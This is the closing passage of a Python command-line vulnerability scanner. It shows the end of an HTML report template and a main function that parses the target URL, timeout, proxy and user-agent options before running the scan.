                            color: 'rgba(255,255,255,0.05)'
                        }},
                        ticks: {{
                            color: '#94a3b8'
                        }}
                    }},
                    y: {{
                        grid: {{
                            display: false
                        }},
                        ticks: {{
                            color: '#94a3b8'
                        }}
                    }}
                }}
            }}
        }});
    </script>
</body>
</html>
        """
        return html_report


def main():
    parser = argparse.ArgumentParser(
        description='Advanced VAPT Scanner - Vulnerability Assessment and Penetration Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python vapt_scanner.py https://example.com
  python vapt_scanner.py https://example.com --timeout 15
  python vapt_scanner.py https://example.com --proxy http://127.0.0.1:8080
        """
    )
    
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Colors.RED}Error: URL must start with http:// or https://{Colors.END}")
        sys.exit(1)
    
    # Initialize and run scanner
    scanner = VAPTScanner(
        target_url=args.url,
        timeout=args.timeout,
        user_agent=args.user_agent,
        proxy=args.proxy
    )
    
    try:
        scanner.run_all_checks()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Scan interrupted by user{Colors.END}")
        if scanner.vulnerabilities:
            scanner.generate_report()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.END}")


if __name__ == "__main__":
    main()

